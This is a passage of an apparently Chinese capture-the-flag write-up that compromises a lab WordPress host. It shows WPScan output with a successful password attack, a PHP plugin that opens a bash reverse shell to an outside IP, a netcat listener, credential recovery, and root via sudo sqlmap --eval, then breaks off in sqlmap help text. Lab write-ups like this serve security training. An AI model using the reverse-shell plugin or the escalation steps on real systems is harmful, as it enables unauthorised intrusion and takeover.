*<br> | Location: http://new.dsz/wp-content/plugins/*/<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> | Confirmed By: Urls In 404 Page (Passive Detection)<br> |<br> | The version could not be determined.<br><br>[+] social-warfare<br> | Location: http://new.dsz/wp-content/plugins/social-warfare/<br> | Last Updated: 2025-03-18T09:37:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 4.5.6<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> | Confirmed By:<br> |  Urls In 404 Page (Passive Detection)<br> |  Comment (Passive Detection)<br> |<br> | [!] 8 vulnerabilities identified:<br> |<br> | [!] Title: Social Warfare &lt;= 3.5.2 - Unauthenticated Arbitrary Settings Update<br> |     Fixed <span class="hljs-keyword">in</span>: 3.5.3<br> |     References:<br> |      - https://wpscan.com/vulnerability/32085d2d-1235-42b4-baeb-bc43172a4972<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9978<br> |      - https://wordpress.org/support/topic/malware-into-new-update/<br> |      - https://www.wordfence.com/blog/2019/03/unpatched-zero-day-vulnerability-in-social-warfare-plugin-exploited-in-the-wild/<br> |      - https://threatpost.com/wordpress-plugin-removed-after-zero-day-discovered/143051/<br> |      - https://twitter.com/warfareplugins/status/1108826025188909057<br> |      - https://www.wordfence.com/blog/2019/03/recent-social-warfare-vulnerability-allowed-remote-code-execution/<br> |<br> | [!] Title: Social Warfare &lt;= 3.5.2 - Unauthenticated Remote Code Execution (RCE)<br> |     Fixed <span class="hljs-keyword">in</span>: 3.5.3<br> |     References:<br> |      - https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618<br> |      - https://www.webarxsecurity.com/social-warfare-vulnerability/<br> |<br> | [!] Title: Social Warfare &lt; 4.3.1 - Subscriber+ Post Meta Deletion<br> |     Fixed <span class="hljs-keyword">in</span>: 4.3.1<br> |     References:<br> |      - https://wpscan.com/vulnerability/5116068f-4b84-42ad-a88d-03e46096b41c<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0402<br> |<br> | [!] Title: Social Warfare &lt; 4.4.0 - Post Meta Deletion via CSRF<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.0<br> |     References:<br> |      - https://wpscan.com/vulnerability/7140abf5-5966-4361-bd51-ee29d3071a30<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0403<br> |<br> | [!] Title: Social Sharing Plugin - Social Warfare &lt; 4.4.4 - Authenticated (Contributor+) Stored Cross-Site Scripting via Shortcode<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.4<br> |     References:<br> |      - https://wpscan.com/vulnerability/ab221b58-369e-4010-ae36-be099b2f4c9b<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4842<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8f5b9aff-0833-4887-ae59-df5bc88c7f91<br> |<br> | [!] Title: Social Sharing Plugin – Social Warfare &lt; 4.4.6.2 - Authenticated(Contributor+) Stored Cross-Site Scripting via Shortcode<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.6.2<br> |     References:<br> |      - https://wpscan.com/vulnerability/26ad138e-990a-4401-84e4-ea694ccf6e7f<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1959<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1016f16c-0ab2-4cac-a7a5-8d93a37e7894<br> |<br> | [!] Title: Social Sharing Plugin – Social Warfare &lt; 4.4.6 - Cross-Site Request Forgery<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.6<br> |     References:<br> |      - https://wpscan.com/vulnerability/acb8b33c-6b74-4d65-a3a5-5cad0c1ea8b0<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34825<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f105bee6-21b2-4014-bb0a-9e53c49e29b0<br> |<br> | [!] Title: Social Warfare &lt; 4.5.6 - Contributor+ Stored XSS<br> |     Fixed <span class="hljs-keyword">in</span>: 4.5.6<br> |     References:<br> |      - https://wpscan.com/vulnerability/447065f5-f2f9-4e0c-b524-c730655f3d79<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-26973<br> |      - https://patchstack.com/database/wordpress/plugin/social-warfare/vulnerability/wordpress-social-warfare-plugin-4-5-4-cross-site-scripting-xss-vulnerability<br> |<br> | Version: 3.5.2 (100% confidence)<br> | Found By: Comment (Passive Detection)<br> |  - http://new.dsz/, Match: <span class="hljs-string">&#x27;Social Warfare v3.5.2&#x27;</span><br> | Confirmed By:<br> |  Query Parameter (Passive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2<br> |   - http://new.dsz/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2<br> |  Readme - Stable Tag (Aggressive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/readme.txt<br> |  Readme - ChangeLog Section (Aggressive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/readme.txt<br><br>[+] Enumerating Config Backups (via Passive and Aggressive Methods)<br> Checking Config Backups - Time: 00:00:02 &lt;================================================================&gt; (137 / 137) 100.00% Time: 00:00:02<br><br>[i] No Config Backups Found.<br><br>[+] Performing password attack on Xmlrpc against 1 user/s<br>Trying sublarge / sublarge2025 Time: 00:00:00 &lt;================================================================&gt; (1 / 1) 100.00% Time: 00:00:00<br>Trying sublarge / sublarge2025 Time: 00:00:00 &lt;================================                                 &gt; (1 / 2) 50.00%  ETA: ??:??:??<br>[SUCCESS] - sublarge / sublarge2025                                                                                                            <br><br>[!] Valid Combinations Found:<br> | Username: sublarge, Password: sublarge2025<br><br>[+] WPScan DB API OK<br> | Plan: free<br> | Requests Done (during the scan): 4<br> | Requests Remaining: 13<br><br>[+] Finished: Wed Jul  2 22:53:57 2025<br>[+] Requests Done: 186<br>[+] Cached Requests: 7<br>[+] Data Sent: 46.455 KB<br>[+] Data Received: 394.551 KB<br>[+] Memory used: 278.145 MB<br>[+] Elapsed <span class="hljs-keyword">time</span>: 00:00:17<br></code></pre></td></tr></table></figure><p>得到网站的用户名和密码：<code>sublarge:sublarge2025</code></p><p>登录网站<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507022257428.png"></p><p>创建一个简单反弹shell的插件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Plugin Name: Reverse Shell Plugin</span><br><span class="hljs-comment"> * Plugin URI: </span><br><span class="hljs-comment"> * Description: Reverse Shell Plugin for penetration testing.</span><br><span class="hljs-comment"> * Version: 1.0</span><br><span class="hljs-comment"> * Author: Security Analyst</span><br><span class="hljs-comment"> * Author URI: http://www.example.com</span><br><span class="hljs-comment"> */</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.86.99/443 0&gt;&amp;1&#x27;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>压缩成<code>zip</code>压缩包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# vi wp_re.php<br><br>┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# zip wp_re.zip wp_re.php <br>  adding: wp_re.php (deflated 29%)<br></code></pre></td></tr></table></figure><p>安装插件，开启监听后，启用插件，成功获取shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.43] 54594<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (471): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@New:/var/www/new.dsz/wp-admin$ <br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong><br><code>/home</code>目录下面有两个用户<code>ahiz</code>和<code>andeli</code><br>但<code>andeli</code>用户权限不足，无法进入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/home$ <span class="hljs-built_in">cd</span> andeli<br><span class="hljs-built_in">cd</span> andeli<br>bash: <span class="hljs-built_in">cd</span>: andeli: Permission denied<br></code></pre></td></tr></table></figure><p>成功获取到<code>user flag</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/home/ahiz$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>flag&#123;user-7b03ed18-5665-11f0-865b-5b1db8a6483b&#125;<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="1、获取andeli权限"><a href="#1、获取andeli权限" class="headerlink" title="1、获取andeli权限"></a>1、获取andeli权限</h2><p><code>/opt</code>目录下面存在一个文件<code>andeli_cred</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/opt$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-xr-x  2 root root  4096 Jul  1 06:34 .<br>drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..<br>-rwx--x--x  1 root root 16840 Jul  1 06:33 andeli_cred<br></code></pre></td></tr></table></figure><p>发现拥有执行权限，尝试运行，运行后发现是<code>md5</code>值，查看前面的行数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/opt$ ./andeli_cred &gt; /tmp/1.txt<br>www-data@New:/tmp$ <span class="hljs-built_in">cat</span> 1.txt|<span class="hljs-built_in">head</span> <br><span class="hljs-built_in">cat</span> 1.txt|<span class="hljs-built_in">head</span> <br>固定MD5插入位置: 7545<br>facbade1e798d215d4685d1316e91510<br>0dbaaac8150e71345acb7de93c241351<br>00caa83bd3945d9a755e3376f9b1c02c<br>0e7b6a63d082d1d462296a053b60b9cb<br>736edd1bd9daaae1d0a3aa8e5fe08acf<br>e2dbff6c8463e44b5eef97de6bfe6bd4<br>dbfda692a0584949829196ff2ed89bc7<br>6b401d2bd84218b9a4a4ba3d8152c192<br>cd2ea498cdae5570a245c72487648f64<br></code></pre></td></tr></table></figure><p>提示固定<code>MD5</code>插入的位置在<code>7545</code>，提取相关的行数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/tmp$ awk <span class="hljs-string">&#x27;NR&gt;7544 &amp;&amp; NR &lt;7547 &#123;print NR &quot;:&quot; $0&#125;&#x27;</span> 1.txt<br>awk <span class="hljs-string">&#x27;NR&gt;7544 &amp;&amp; NR &lt;7547 &#123;print NR &quot;:&quot; $0&#125;&#x27;</span> 1.txt<br>7545:c82402fcc82eede0d7de1a3a03e713ae<br>7546:9eeb22195b4eb7a35bcad0f45761eb7b<br></code></pre></td></tr></table></figure><p>找到目标的<code>MD5</code>值：<code>9eeb22195b4eb7a35bcad0f45761eb7b</code></p><p>直接使用<code>MD5值</code>即可登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/tmp$ su - andeli<br>su - andeli<br>Password: 9eeb22195b4eb7a35bcad0f45761eb7b<br><span class="hljs-built_in">id</span><br>uid=1002(andeli) gid=1002(andeli) <span class="hljs-built_in">groups</span>=1002(andeli)<br>/usr/bin/script -qc /bin/bash /dev/null<br>andeli@New:~$ <br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>执行<code>sudo -l</code>，发现可以执行<code>/usr/bin/sqlmap</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@New:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> andeli on New:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User andeli may run the following commands on New:<br>    (ALL) NOPASSWD: /usr/bin/sqlmap<br></code></pre></td></tr></table></figure><h3 id="sqlmap提权"><a href="#sqlmap提权" class="headerlink" title="sqlmap提权"></a>sqlmap提权</h3><h4 id="方案一：sudo"><a href="#方案一：sudo" class="headerlink" title="方案一：sudo"></a>方案一：sudo</h4><p>直接使用<code>gtfobins</code>的方案<br><a href="https://gtfobins.github.io/gtfobins/sqlmap/">https://gtfobins.github.io/gtfobins/sqlmap/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> sqlmap -u 127.0.0.1 --<span class="hljs-built_in">eval</span>=<span class="hljs-string">&quot;import os; os.system(&#x27;/bin/sh&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>运行即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@New:~$ <span class="hljs-built_in">sudo</span> sqlmap -u 127.0.0.1 --<span class="hljs-built_in">eval</span>=<span class="hljs-string">&quot;import os; os.system(&#x27;/bin/sh&#x27;)&quot;</span><br>        ___<br>       __H__<br> ___ ___[<span class="hljs-string">&quot;]_____ ___ ___  &#123;1.5.2#stable&#125;</span><br><span class="hljs-string">|_ -| . [&#x27;]     | .&#x27;| . |</span><br><span class="hljs-string">|___|_  [&#x27;]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   http://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 10:17:55 /2025-07-02/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[10:17:55] [INFO] testing connection to the target URL</span><br><span class="hljs-string"># id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root)</span><br></code></pre></td></tr></table></figure><h4 id="方案二：sqlmap读取文件"><a href="#方案二：sqlmap读取文件" class="headerlink" title="方案二：sqlmap读取文件"></a>方案二：sqlmap读取文件</h4><p>查看<code>sqlmap</code>的详细用法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@New:~$ <span class="hljs-built_in">sudo</span> /usr/bin/sqlmap -hh<br>        ___<br>       __H__<br> ___ ___[(]_____ ___ ___  &#123;1.5.2#stable&#125;<br>|_ -| . [.]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [&quot;]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   http://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">Usage: python3 sqlmap [options]</span><br><span class="hljs-string"></span><br><span class="hljs-string">Options:</span><br><span class="hljs-string">  -h, --help            Show basic help message and exit</span><br><span class="hljs-string">  -hh                   Show advanced help message and exit</span><br><span class="hljs-string">  --version             Show program&#x27;</span>s version number and <span class="hljs-built_in">exit</span><br>  -v VERBOSE            Verbosity level: 0-6 (default 1)<br><br>  Target:<br>    At least one of these options has to be provided to define the<br>    target(s)<br><br>    -u URL, --url=URL   Target URL (e.g. <span class="hljs-string">&quot;http://www.site.com/vuln.php?id=1&quot;</span>)<br>    -d DIRECT           Connection string <span class="hljs-keyword">for</span> direct database connection<br>    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy <span class="hljs-built_in">log</span> file<br>    -m BULKFILE         Scan multiple targets given <span class="hljs-keyword">in</span> a textual file<br>    -r REQUESTFILE      Load HTTP request from a file<br>    -g GOOGLEDORK       Process Google dork results as target URLs<br>    -c CONFIGFILE       Load options from a configuration INI file<br><br>  Request:<br>    These options can be used to specify how to connect to the target URL<br><br>    -A AGENT, --user..  HTTP User-Agent header value<br>    -H HEADER, --hea..  Extra header (e.g. <span class="hljs-string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span>)<br>    --method=METHOD     Force usage of given HTTP method (e.g. PUT)<br>    --data=DATA         Data string to be sent through POST (e.g. <span class="hljs-string">&quot;id=1&quot;</span>)<br>    --param-del=PARA..  Character used <span class="hljs-keyword">for</span> splitting parameter values (e.g. &amp;)<br>    --cookie=COOKIE     HTTP Cookie header value (e.g. <span class="hljs-string">&quot;PHPSESSID=a8d127e..&quot;</span>)<br>    --cookie-del=COO..  Character used <span class="hljs-keyword">for</span> splitting cookie values (e.g. ;)<br>    --live-cookies=L..  Live cookies file used <span class="hljs-keyword">for</span> loading up-to-date values<br>    --load-cookies=L..  File containing cookies <span class="hljs-keyword">in</span> Netscape/wget format<br>    --drop-set-cookie   Ignore Set-Cookie header from response<br>    --mobile            Imitate smartphone through HTTP User-Agent header<br>    --random-agent      Use randomly selected HTTP User-Agent header value<br>    --host=HOST         HTTP Host header value<br>    --referer=REFERER   HTTP Referer header value<br>    --headers=HEADERS   Extra headers (e.g. <span class="hljs-string">&quot;Accept-Language: fr\nETag: 123&quot;</span>)<br>    --auth-type=AUTH..  HTTP authentication <span class="hljs-built_in">type</span> (Basic, Digest, NTLM or PKI)<br>    --auth-cred=AUTH..  HTTP authentication credentials (name:password)<br>    --auth-file=AUTH..  HTTP authentication PEM cert/private key file<br>    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)<br>    --ignore-proxy      Ignore system default proxy settings<br>    --ignore-redirects  Ignore redirection attempts<br>    --ignore-timeouts   Ignore connection timeouts<br>    --proxy=PROXY       Use a proxy to connect to the target URL<br>    --proxy-cred=PRO..  Proxy authentication credentials (name:password)<br>    --proxy-file=PRO..  Load proxy list from a file<br>    --proxy-freq=PRO..  Requests between change of proxy from a given list<br>    --tor               Use Tor anonymity network<br>    --tor-port=TORPORT  Set Tor proxy port other than default<br>    --tor-type=TORTYPE  Set Tor proxy <span class="hljs-built_in">type</span> (HTTP, SOCKS4 or SOCKS5 (default))<br>    --check-tor         Check to see <span class="hljs-keyword">if</span> Tor is used properly<br>    --delay=DELAY       Delay <span class="hljs-keyword">in</span> seconds between each HTTP request<br>    --<span class="hljs-built_in">timeout</span>=TIMEOUT   Seconds to <span class="hljs-built_in">wait</span> before <span class="hljs-built_in">timeout</span> connection (default 30)<br>    --retries=RETRIES   Retries when the connection timeouts (default 3)<br>    --randomize=RPARAM  Randomly change value <span class="hljs-keyword">for</span> given parameter(s)<br>    --safe-url=SAFEURL  URL address to visit frequently during testing<br>    --safe-post=SAFE..  POST data to send to a safe URL<br>    --safe-req=SAFER..  Load safe HTTP request from a file<br>    --safe-freq=SAFE..  Regular requests between visits to a safe URL<br>    --skip-urlencode    Skip URL encoding of payload data<br>    --csrf-token=CSR..  Parameter used to hold anti-CSRF token<br>    --csrf-url=CSRFURL  URL address to visit <span class="hljs-keyword">for</span> extraction of anti-CSRF token<br>    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit<br>    --csrf-retries=C..  Retries <span class="hljs-keyword">for</span> anti-CSRF token retrieval (default 0)<br>    --force-ssl         Force usage of SSL/HTTPS<br>    --chunked           Use HTTP chunked transfer encoded (POST) requests<br>    --hpp               Use HTTP parameter pollution method<br>    --<span class="hljs-built_in">eval</span>=EVALCODE     Evaluate provided Python code before the request (e.g.<br>                        <span class="hljs-string">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;</span>)<br><br>  Optimization:<br>    These options can be used to optimize the performance of sqlmap<br><br>    -o                  Turn on all optimization switches<br>    --predict-output    Predict common queries output<br>    --keep-alive        Use persistent HTTP(s) connections<br>    --null-connection   Retrieve page length without actual HTTP response body<br>    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)<br><br>  Injection:<br>    These options can be used to specify <span class="hljs-built_in">which</span> parameters to <span class="hljs-built_in">test</span> <span class="hljs-keyword">for</span>,<br>    provide custom injection payloads and optional tampering scripts<br><br>    -p TESTPARAMETER    Testable parameter(s)<br>    --skip=SKIP         Skip testing <span class="hljs-keyword">for</span> given parameter(s)<br>    --skip-static       Skip testing parameters that not appear to be dynamic<br>    --param-exclude=..  Regexp to exclude parameters from testing (e.g. <span class="hljs-string">&quot;ses&quot;</span>)<br>    --param-filter=P..  Select testable parameter(s) by place (e.g. <span class="hljs-string">&quot;POST&quot;</span>)<br>    --dbms=DBMS         Force back-end DBMS to provided value<br>    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)<br>    --os=OS             Force back-end DBMS operating system to provided value<br>    --invalid-bignum    Use big numbers <span class="hljs-keyword">for</span> invalidating values<br>    --invalid-logical   Use logical operations <span class="hljs-keyword">for</span> invalidating values<br>    --invalid-string    Use random strings <span class="hljs-keyword">for</span> invalidating values<br>    --no-cast           Turn off payload casting mechanism<br>    --no-escape         Turn off string escaping mechanism<br>    --prefix=PREFIX     Injection payload prefix string<br>    --suffix=SUFFIX     Injection payload suffix string<br>    --tamper=TAMPER     Use given script(s) <span class="hljs-keyword">for</span> tampering injection data<br><br>  Detection:<br>    These options can be used to customize the detection phase<br><br>    --level=LEVEL       Level of tests to perform (1-5, default 1)<br>    --risk=RISK         Risk of tests to perform (1-3, default 